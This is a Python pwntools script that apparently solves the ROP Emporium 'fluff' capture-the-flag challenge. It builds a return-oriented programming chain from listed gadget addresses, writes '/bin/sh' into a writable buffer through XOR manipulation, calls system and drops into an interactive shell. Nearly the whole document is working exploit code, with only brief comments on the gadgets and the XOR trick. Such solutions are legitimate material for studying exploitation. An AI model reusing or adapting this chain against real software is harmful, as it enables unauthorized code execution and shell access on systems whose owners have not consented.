from pwn import *

# xor r11,r11; pop r14; mov edi,0x601050; ret;
gadget1 = 0x400822
# pop r12; mov r13d,0x604060; ret;
gadget2 = 0x400832
# xor r11,r12; pop r12; mov r13d,0x604060; ret;
gadget3 = 0x40082f
# xchg r11,r10; pop r15; mov r11d,0x602050; ret;
gadget4 = 0x400840
# mov edi,0x601050; ret;
gadget5 = 0x400827
# mov QWORD PTR [r10],r11; pop r13; pop r12; xor BYTE PTR [r10],r12b; ret;
gadget6 = 0x40084e

system = 0x4005e0
buffer = 0x601050

p = process('./fluff')

payload = 'a' * 40
payload += p64(gadget1)
payload += 'bbbbbbbb'

payload += p64(gadget2)
payload += p64(0x601050)

payload += p64(gadget3)
payload += 'bbbbbbbb'

payload += p64(gadget4)
payload += 'bbbbbbbb'

payload += p64(gadget2)
# since data is stored in little endian, we have to
# xor the data present in register r11 with the reverse
# of our desired string
# '/bin/sh\x00'[::-1].encode('hex') ^ 0x602050
# xor 0x602050 with this to get /bin/sh
payload += p64(0x68732f6e09427f)

payload += p64(gadget3)
payload += 'bbbbbbbb'

# now r11 contains /bin/sh\x00
# and r10 contains the data address
payload += p64(gadget6)
payload += 'bbbbbbbb'
payload += '\x00' * 8

payload += p64(gadget5)

payload += p64(system)
payload += 'cccccccc'

p.sendline(payload)
p.interactive()
